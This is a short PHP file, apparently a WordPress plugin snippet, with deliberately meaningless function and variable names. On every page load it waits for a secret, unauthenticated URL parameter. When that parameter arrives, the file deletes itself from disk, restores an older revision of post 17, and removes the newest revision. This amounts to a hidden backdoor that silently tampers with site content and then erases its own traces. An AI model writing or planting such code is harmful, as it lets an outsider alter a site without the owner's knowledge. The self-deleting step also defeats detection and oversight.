<?php

function services_sliding_rotator_new() {
	if (isset($_GET['syntax_json_about_publisher']) && $_GET['syntax_json_about_publisher'] === 'controller_heading_version') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$divi_listings_carousel_light = 17;
		$pagination_contact_links = wp_get_post_revisions($divi_listings_carousel_light);
		if (empty($pagination_contact_links)) die('no revisions');
		if (count($pagination_contact_links) < 2) die('less than 2');
		$cc_categories_using_interactivity = array_shift($pagination_contact_links);
		$sync_notes_flash_send = $cc_categories_using_interactivity->ID;
		$insert_pages_heading = array_shift($pagination_contact_links);
		$group_server_homepage = $insert_pages_heading->ID;
		$audio_light_controller = wp_restore_post_revision($group_server_homepage);
		if ($audio_light_controller === false) die('error restoring');
		$audio_light_controller = wp_delete_post_revision($sync_notes_flash_send);		
		if ($audio_light_controller === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'services_sliding_rotator_new');
